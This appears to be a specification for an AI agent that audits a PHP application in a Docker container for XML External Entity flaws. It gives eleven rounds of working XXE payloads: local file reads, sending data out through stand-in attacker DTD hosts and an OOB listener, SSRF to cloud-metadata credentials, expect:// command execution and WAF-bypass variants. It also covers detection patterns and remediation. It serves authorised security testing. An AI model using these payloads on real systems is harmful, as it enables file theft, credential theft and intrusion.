> **Skill ID**: S-047-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploits/{sink_id}.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-047-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against XML External Entity sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 11 attack rounds — if stuck after round 9, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST confirm entity expansion by observing file content or OOB callback — DTD acceptance alone does not confirm XXE | FAIL — parser accepts DTD but does not expand entities |
| CR-PAYLOAD | MUST test payloads in priority order (1→2→3→4) within each round — MUST NOT skip Priority 1 to try creative payloads directly | FAIL — uncontrolled payload selection, wastes rounds on low-probability attacks |

## 11 Attack Rounds
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly


#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - Basic External Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
Target: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, application config files.
**Evidence:** Response contains file contents (e.g., `root:x:0:0:`).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R2 - Parameter Entity Recursion

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```
`evil.dtd`: `<!ENTITY % all "<!ENTITY send '%file;'>"> %all;`
**Evidence:** Parameter entity parsed successfully and data exfiltrated.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R3 - Blind XXE (Out-of-Band)

Use the OOB listener within the Docker environment instead of an external server:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://oob-listener:9001/xxe-dtd-${SINK_ID}">
  %dtd;
]>
```
`oob.dtd` (placed in the `$WORK_DIR/oob/` directory for the listener to serve):
`<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://oob-listener:9001/xxe-exfil-${SINK_ID}?data=%file;'>"> %exfil; %send;`

**Verify via OOB logs:** `grep "xxe-exfil-${SINK_ID}" $WORK_DIR/oob/log.jsonl` — presence confirms Blind XXE via log records.
**Evidence:** OOB listener log received HTTP request containing Base64-encoded file data.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R4 - CDATA Wrapping to Bypass WAF

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/cdata.dtd">
  %dtd;
]>
<root>&all;</root>
```
`cdata.dtd`: `<!ENTITY all "%start;%file;%end;">`
**Evidence:** File contents returned wrapped in CDATA.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R5 - Encoding Bypass (UTF-7/UTF-16)

Re-encode XML to bypass UTF-8 input validation that checks for `<!DOCTYPE`/`<!ENTITY`:
- UTF-16 BE/LE (with BOM)
- UTF-7: `+ADwAIQ-DOCTYPE ...`
- `<?xml version="1.0" encoding="UTF-7"?>`

**Evidence:** Parser accepts the alternative encoding and processes entities.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R6 - XInclude Attack

When unable to control the full XML document but can inject values:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
**Evidence:** XInclude parsing succeeds and file contents appear in the response.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R7 - SVG/DOCX/XLSX XML Carriers

Embed XXE in XML-format files and upload:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```
DOCX/XLSX: Decompress, inject into `[Content_Types].xml` or `word/document.xml`, recompress.
**Evidence:** Server-side parser processes the carrier file and resolves entities.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R8 - Chained (XXE → SSRF → Internal Data)

Chain XXE with SSRF to reach internal services:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://localhost:6379/INFO">
<!ENTITY xxe SYSTEM "http://internal-api:8080/admin/users">
```
Path: XXE → Cloud metadata → IAM credentials → Internal API → Sensitive data.
**Evidence:** Response contains internal service data, cloud credentials, or metadata.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R9 - PHP-Specific XXE Techniques

- **expect:// protocol → RCE**:
  ```xml
  <!ENTITY xxe SYSTEM "expect://id">
  ```
  - Requires PHP `expect` extension to be installed
  - Direct command execution, highest severity
- **php://filter in XXE**:
  ```xml
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  ```
  - Bypasses XML special character restrictions
  - Can read binary files
- **compress.zlib:// bypass**:
  ```xml
  <!ENTITY xxe SYSTEM "compress.zlib:///etc/passwd">
  ```

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R10 - JSON → XML Content-Type Switching

Objective: Send XML Content-Type requests to JSON API endpoints to test for XML parsing.

- Change `Content-Type: application/json` to `Content-Type: application/xml` or `text/xml`
- Many frameworks support both JSON and XML input but only apply security measures to JSON
- Laravel: `Request::all()` automatically handles XML body (version-dependent)
- Symfony: Locate the `format_listener` configuration
- Convert JSON body to equivalent XML:
  ```json
  {"user": "admin"}
  ```
  →
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root><user>&xxe;</user></root>
  ```

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R11 - XXE in File Parsing Libraries

- **PHPExcel / PhpSpreadsheet**:
  - XLSX is a ZIP containing XML → XML is parsed after extraction
  - Inject XXE into `xl/sharedStrings.xml`
- **PHPWord**:
  - DOCX is also ZIP+XML
  - Inject into `word/document.xml`
- **XML-RPC**:
  - WordPress XML-RPC: `/xmlrpc.php`
  - Inject entities into methodCall XML
- **RSS/Atom Feed Parsing**:
  - Search for `simplexml_load_string` processing RSS
  - Inject entities into Feed XML
- **SOAP WSDL**:
  - `SoapClient` loads malicious WSDL
  - XSD import within WSDL → SSRF/XXE

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| File contents in response | HTTP response contains `root:x:0:0:root:/root:/bin/bash` |
| Out-of-band HTTP request received | Attacker server log shows request containing Base64-encoded data |
| DNS query triggered | DNS query observed for `[data].attacker.com` |
| Internal service response | Cloud metadata, Redis INFO, or internal API data |
| Error-based leakage | XML parsing error leaks partial file contents |

## Report Format

```json
{
  "vuln_type": "XXE",
  "round": 3,
  "endpoint": "POST /api/import",
  "sink_function": "simplexml_load_string",
  "payload": "<Payload used>",
  "evidence": "<Exact response excerpt or OOB log>",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Local file read|SSRF|RCE via expect://",
  "remediation": "Set LIBXML_NOENT to 0, use libxml_disable_entity_loader(true) for PHP < 8.0"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential XXE vulnerabilities:
- Pattern 1: `simplexml_load_string($userInput)` — XML parsing without disabling external entities, user-controllable input
- Pattern 2: `$dom = new DOMDocument(); $dom->loadXML($xml)` — DOMDocument loading user-supplied XML without setting `LIBXML_NOENT`
- Pattern 3: `libxml_disable_entity_loader(false)` — Explicitly enables external entity loading (PHP < 8.0)
- Pattern 4: `Content-Type: application/json` endpoint also accepts `application/xml` — JSON API implicitly supports XML input
- Pattern 5: `PhpSpreadsheet::load($uploadedFile)` / `simplexml_load_string($rssContent)` — XML parsing within file parsing libraries (XLSX/DOCX/RSS/SOAP)
- Pattern 6: `$xml->xpath($userInput)` — XPath injection can lead to data extraction

## Key Insight

> **Key Point**: XXE auditing MUST NOT only search for explicit XML parsing functions like `simplexml_load_string`/`DOMDocument`, but MUST also cover all implicit XML processing scenarios (XLSX/DOCX uploads, RSS Feeds, SOAP/WSDL, SVG rendering, JSON→XML Content-Type switching). PHP 8.0+ disables external entities by default, but the `LIBXML_NOENT` flag and `$dom->substituteEntities = true` can still re-enable them.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find missed filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other specialists
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds on hallucinated results

## Prerequisite Conditions and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the route's auth_level in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-XXE-001"
}
```
- All reason fields MUST be filled with specific justification; MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_XXE_PARSER_CALL` — XML parser call location ✅Required
- `EVID_XXE_INPUT_SOURCE` — XML input source ✅Required
- `EVID_XXE_ENTITY_SAFETY` — Entity safety status ✅Required
- `EVID_XXE_EXECUTION_RESPONSE` — Attack response evidence (Required when confirmed)

Missing a required EVID → Conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-back

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` for the write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final result to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Report Format` above is the per-round internal recording format; the final output MUST be consolidated into the exploit.json structure.

## Collaboration

- Pass SSRF-reachable internal endpoints to the SSRF Auditor
- Pass credentials/key data found in files to the Information Leakage Auditor
- All findings MUST be submitted to the QA Reviewer for evidence verification before final confirmation

## Constraints

- MUST NOT modify or delete files on the target system
- All out-of-band data exfiltration MUST use only the designated attacker-controlled infrastructure
- Stop escalation after R1 confirms via response content; continue to higher rounds only when lower rounds fail or coverage is needed



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "xxe_import_001",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "successful_round": 1,
  "payload": "<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>",
  "evidence_result": "Response body contains root:x:0:0:root:/root:/bin/bash from entity resolution",
  "severity": {
    "level": "H",
    "score": 2.4,
    "cvss": 8.0
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.4 → cvss 8.0 → level `H`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "xxe_import_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "<!ENTITY xxe SYSTEM "file:///etc/passwd">",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "M",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no file content from entity resolution shown
- failure_reason is empty — no explanation of parsing result
- severity_level 'M' for confirmed XXE reading /etc/passwd — should be H or C

---

## Pre-submission Self-check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute general items (G1-G8); proceed only after all are ✅
2. Execute the specialist self-checks below (S1-S3); submit only after all are ✅
3. Any item ❌ → Fix and re-check; MUST NOT skip

### Specialist Self-checks (XXE Auditor Specific)
- [ ] S1: XML parser type (SimpleXML/DOMDocument/XMLReader) has been annotated
- [ ] S2: Complete payload with external entity definition and reference has been shown
- [ ] S3: libxml_disable_entity_loader status has been confirmed

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| XML parser configured to disable external entities | Test with parameter entities and XInclude; if all disabled → record `"status": "xxe_disabled"` |
| DTD loading blocked by network policy | Attempt local DTD reuse (`/usr/share/xml/`); if blocked → record `"dtd_blocked": true` |
| No XML input accepted by target endpoint | Record `"status": "no_xml_endpoint"`, set `final_verdict: "not_vulnerable"` |
| Payload blocked by WAF/filter | Log filter type, switch to encoded XML variant; if all variants fail → record `"waf_blocked": true` |
